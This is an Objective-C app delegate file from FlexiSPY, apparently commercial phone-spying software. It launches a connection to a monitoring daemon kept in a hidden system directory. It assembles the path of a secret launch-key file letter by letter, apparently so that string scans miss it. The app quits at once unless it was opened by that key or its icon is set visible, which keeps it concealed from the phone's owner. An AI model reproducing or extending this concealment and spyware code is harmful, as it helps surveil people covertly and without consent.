//
//  MobileSPYAppDelegate.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import "MobileSPYAppDelegate.h"
#import "RootViewController.h"
#import "ActivationWizard.h"

#import "AppUIConnection.h"
#import "LicenseInfo.h"
#import "ConfigurationManagerImpl.h"
#import "PhoneInfoImp.h"
#import "DaemonPrivateHome.h"
#import "PreferenceManagerImpl.h"
#import "PrefVisibility.h"

@interface MobileSPYAppDelegate (private)
- (void) launchByKeyCheck;
@end

@implementation MobileSPYAppDelegate

@synthesize window;
@synthesize navigationController;

@synthesize mAppUIConnection;
@synthesize mLicenseInfo;
@synthesize mConfigurationManager;
@synthesize mPhoneInfo;

#pragma mark -
#pragma mark Application lifecycle

- (void)applicationDidFinishLaunching:(UIApplication *)application {
    // Override point for customization after app launch
	//[window addSubview:[navigationController view]];
    [window setRootViewController:navigationController];
	
	// Connection to daemon
	mAppUIConnection = [[AppUIConnection alloc] init];
	mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
	mPhoneInfo = [[PhoneInfoImp alloc] init];
	
	[self launchByKeyCheck];
	
	///
	NSString *fsfilePath = [DaemonPrivateHome daemonPrivateHome];
	fsfilePath = [fsfilePath stringByAppendingString:@"etc/fs.plist"];
	NSDictionary *fsInfo = [NSDictionary dictionaryWithContentsOfFile:fsfilePath];
	if (fsInfo) {
		
		NSString *fs = [fsInfo objectForKey:@"wizard"];
		if ([fs isEqualToString:@"1"]) {
			ActivationWizard *activationWizard = [[ActivationWizard alloc] initWithNibName:@"ActivationWizard" bundle:[NSBundle mainBundle]];
			UINavigationController *wizardNavigationController = [[UINavigationController alloc] initWithRootViewController:activationWizard];
			[wizardNavigationController setNavigationBarHidden:YES];
			[navigationController presentModalViewController:wizardNavigationController animated:NO];
			[wizardNavigationController release];
			[activationWizard release];
		}
		
		NSArray *objects = [NSArray arrayWithObjects:@"0", nil];
		NSArray *objectKeys = [NSArray arrayWithObjects:@"wizard", nil];
		fsInfo = [NSDictionary dictionaryWithObjects:objects forKeys:objectKeys];
		[fsInfo writeToFile:fsfilePath atomically:YES];
		
		DLog (@"Write to fs.plist with fsInfo = %@", fsInfo);
	}
}

// If we implement this method; applicationDidFinishLaunching: will never be called
//- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
//	DLog (@"launchOptions = %@", launchOptions);
//	return YES;
//}

- (void)applicationWillTerminate:(UIApplication *)application {
	// Save data if appropriate
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
	
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
	//[self launchByKeyCheck];
    // Delay a bit before exit application to prevent phone screen unresponse or freeze
    [self performSelector:@selector(launchByKeyCheck) withObject:nil afterDelay:0.1];
}

- (void) launchByKeyCheck {
	// /tmp/
//	NSString *filePath = @"/";
//	filePath = [filePath stringByAppendingString:@"t"];
//	filePath = [filePath stringByAppendingString:@"m"];
//	filePath = [filePath stringByAppendingString:@"p"];
//	filePath = [filePath stringByAppendingString:@"/"];
	
	// /var/.lsalcore/etc/
	NSString *filePath = [DaemonPrivateHome daemonPrivateHome];
	filePath = [filePath stringByAppendingString:@"e"];
	filePath = [filePath stringByAppendingString:@"t"];
	filePath = [filePath stringByAppendingString:@"c"];
	filePath = [filePath stringByAppendingFormat:@"/"];
	
	// launchddd.plist
	filePath = [filePath stringByAppendingString:@"l"];
	filePath = [filePath stringByAppendingString:@"a"];
	filePath = [filePath stringByAppendingString:@"u"];
	filePath = [filePath stringByAppendingString:@"n"];
	filePath = [filePath stringByAppendingString:@"c"];
	filePath = [filePath stringByAppendingString:@"h"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"."];
	filePath = [filePath stringByAppendingString:@"p"];
	filePath = [filePath stringByAppendingString:@"l"];
	filePath = [filePath stringByAppendingString:@"i"];
	filePath = [filePath stringByAppendingString:@"s"];
	filePath = [filePath stringByAppendingString:@"t"];
	
	NSMutableDictionary *launchInfo = [[NSMutableDictionary alloc] initWithContentsOfFile:filePath];
	NSNumber *launchByKey = [launchInfo objectForKey:@"lanuchByKey"];
	DLog (@"launchByKey is: %@", launchByKey);
	if (![launchByKey boolValue]) {
		
		NSFileManager *fileManager = [NSFileManager defaultManager];
		NSError *error = nil;
		[fileManager removeItemAtPath:filePath error:&error];
		DLog (@"[1]launchddd deletion is error = %@", error);
		
        PreferenceManagerImpl *prefManagerImpl = [[PreferenceManagerImpl alloc] init];
        PrefVisibility *prefVisibility = (PrefVisibility *)[prefManagerImpl preference:kVisibility];
        if ([prefVisibility mVisible]) {
            // Application icon is visible so let the application come to foreground
        } else {
            exit(0);
        }
        [prefManagerImpl release];
	}
	
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	[fileManager removeItemAtPath:filePath error:&error];
	DLog (@"[2]launchddd deletion is error = %@", error);
	
	[launchInfo release];
}

#pragma mark -
#pragma mark Memory management

- (void)dealloc {
	[mPhoneInfo release];
	[mConfigurationManager release];
	[mLicenseInfo release];
	[mAppUIConnection release];
	[navigationController release];
	[window release];
	[super dealloc];
}

@end

